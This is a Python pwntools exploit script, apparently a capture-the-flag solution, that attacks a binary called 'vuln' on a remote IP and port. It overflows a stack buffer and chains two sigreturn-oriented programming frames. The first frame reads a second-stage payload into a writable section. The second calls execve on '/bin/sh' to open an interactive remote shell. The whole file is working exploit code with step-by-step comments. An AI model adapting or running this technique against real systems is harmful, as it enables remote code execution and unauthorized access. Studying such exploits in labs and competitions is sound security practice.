# coding: utf-8
from pwn import *
#p = process("./vuln")
p = remote("207.154.239.148", 1345)
elf = ELF("./vuln")
context.arch = "amd64"
p.recv()

pop_rax = 0x401032 # pop rax; syscall --> from ROPgadget --binary
syscall = 0x401033 # syscall; leave; ret --> from r2 -Ad
rw = 0x402040 # read-write section --> idk from where

payload = b"A"*136 + p64(pop_rax) + p64(0xf)  # overflow to returnAddr, do pop rax; syscall, and then make syscall rax=15 for sys_sigreturn

# Sigreturn frame
frame = SigreturnFrame()
frame.rax = 0 # Read syscall
frame.rsp = rw+8 # move the stack pointer to the bss segment
frame.rbp = rw+0x60 # Move the base pointer to the bss segment
frame.rdi = 0 # Read from stdin
frame.rsi = rw # Read into the read-write section
frame.rdx = 0x400 # Read 0x400 bytes
frame.rip = syscall # Jump to the syscall; leave; ret gadget after syscall

payload += bytes(frame)
p.sendline(payload)

# Now we start our new payload in the bss segment
payload2 = b'/bin/sh\x00' # Input /bin/sh\x00 to use later
payload2 += b"A"*96 + p64(pop_rax) + p64(0xf)  # Overwrite until return address in our "emulated" stack, Jump to pop rax; syscall, and then Make syscall rax=15 for sys_sigreturn

# Call sys_execve now
frame = SigreturnFrame()
frame.rax = 59 # sys_execve
frame.rdi = rw # addr of /bin/sh\x00
frame.rsi = 0 # needs to be null
frame.rdx = 0 # needs to be null
frame.rip = syscall # Jump to syscall;

payload2 += bytes(frame)

p.sendline(payload2)
p.interactive()
